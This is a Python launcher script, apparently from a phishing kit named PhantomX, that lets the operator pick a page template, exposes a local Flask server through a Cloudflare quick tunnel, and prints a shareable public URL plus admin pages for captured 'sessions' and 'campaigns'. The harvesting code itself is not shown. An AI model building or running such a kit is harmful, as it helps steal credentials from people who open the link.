# Copyright (c) 2025 Your Name — github.com/h4ckcrypt/PhantomX
# Non-commercial use only. See LICENSE.

import os
import sys
import subprocess
import re
import time

# ── Config ─────────────────────────────────────────────────────────
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin1234")
PORT       = int(os.environ.get("PORT", 5000))

BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, "templates/")


# ── Helpers ────────────────────────────────────────────────────────
def list_templates():
    return [
        d for d in os.listdir(TEMPLATE_DIR)
        if os.path.isdir(os.path.join(TEMPLATE_DIR, d))
        and not d.startswith((".", "_"))
    ]


def start_cloudflare_tunnel(port):
    print(f"[+] Starting Cloudflare tunnel on port {port}…")
    

    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    public_url = None

    # Read output to capture URL
    for _ in range(60):
        line = proc.stdout.readline()

        if not line:
            time.sleep(0.5)
            continue

        print(line.strip())

        match = re.search(r"https://[-a-z0-9]+\.trycloudflare\.com", line)
        if match:
            public_url = match.group(0)
            break

    if not public_url:
        print("❌ Failed to get Cloudflare URL")
        proc.terminate()
        sys.exit(1)

    return proc, public_url


# ── Main ───────────────────────────────────────────────────────────
def main():

    # ── Template selection ─────────────────────────────────────────
    templates = list_templates()

    if not templates:
        print(f"❌ No templates found in {TEMPLATE_DIR}")
        sys.exit(1)

    print("Available templates:")
    for i, t in enumerate(templates):
        print(f"  [{i + 1}] {t}")

    try:
        choice = int(input("\nSelect template number: ")) - 1
        if not (0 <= choice < len(templates)):
            raise ValueError
    except ValueError:
        print("❌ Invalid selection.")
        sys.exit(1)

    selected = templates[choice]
    print(f"\n[+] Template: {selected}")

    # ── Start Cloudflare Tunnel ────────────────────────────────────
    tunnel_proc, public_url = start_cloudflare_tunnel(PORT)

    # ── Inject env vars BEFORE importing Flask app ─────────────────
    os.environ["SELECTED_TEMPLATE"] = selected
    os.environ["ADMIN_USER"]        = ADMIN_USER
    os.environ["ADMIN_PASS"]        = ADMIN_PASS
    os.environ["PUBLIC_URL"]        = public_url
    os.environ.setdefault("SECRET_KEY", os.urandom(24).hex())

    # ── Print info banner ─────────────────────────────────────────
    local = f"http://127.0.0.1:{PORT}"

    print("\n" + "─" * 58)
    print(f"  🌐 Public URL     : {public_url}")
    print(f"       (share this link)")
    print()
    print(f"  🔒 Admin login   : {local}/login")
    print(f"  📊 Sessions      : {local}/dashboard")
    print(f"  📁 Campaigns     : {local}/campaigns")
    print()
    print(f"  Admin user : {ADMIN_USER}")
    print(f"  Admin pass : {ADMIN_PASS}")
    print("─" * 58)
    print()
    print("  Press Ctrl+C to stop.\n")

    # ── Start Flask ───────────────────────────────────────────────
    try:
        import server.app as srv
        srv.app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

    except KeyboardInterrupt:
        print("\n[!] Shutting down...")

    finally:
        print("[+] Stopping Cloudflare tunnel...")
        tunnel_proc.terminate()


# ── Entry ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    main()
